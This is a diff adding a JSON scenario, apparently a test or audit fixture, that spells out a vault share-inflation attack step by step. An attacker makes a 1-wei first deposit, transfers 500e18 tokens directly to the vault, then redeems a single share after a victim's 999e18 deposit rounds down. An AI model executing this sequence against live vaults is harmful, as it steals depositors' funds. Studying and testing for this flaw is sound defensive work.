@@ -1,0 +1,11 @@
+{
+  "description": "Donation/inflation attack: attacker seeds the vault with 1 wei deposit to become first depositor at 1:1, donates a large amount of tokens directly via transfer (bypassing deposit()) to inflate the vault's real balance without minting shares, then redeems their single share once the victim deposits -- extracting a disproportionate cut of the victim's funds.",
+  "steps": [
+    {"actor": "attacker", "contract": "token", "function": "approve(address,uint256)", "args": ["<vault>", "1"], "value": "0"},
+    {"actor": "attacker", "contract": "vault", "function": "deposit(uint256)", "args": ["1"], "value": "0"},
+    {"actor": "attacker", "contract": "token", "function": "transfer(address,uint256)", "args": ["<vault>", "500000000000000000000"], "value": "0"},
+    {"actor": "victim", "contract": "token", "function": "approve(address,uint256)", "args": ["<vault>", "999000000000000000000"], "value": "0"},
+    {"actor": "victim", "contract": "vault", "function": "deposit(uint256)", "args": ["999000000000000000000"], "value": "0"},
+    {"actor": "attacker", "contract": "vault", "function": "redeem(uint256)", "args": ["1"], "value": "0"}
+  ]
+}
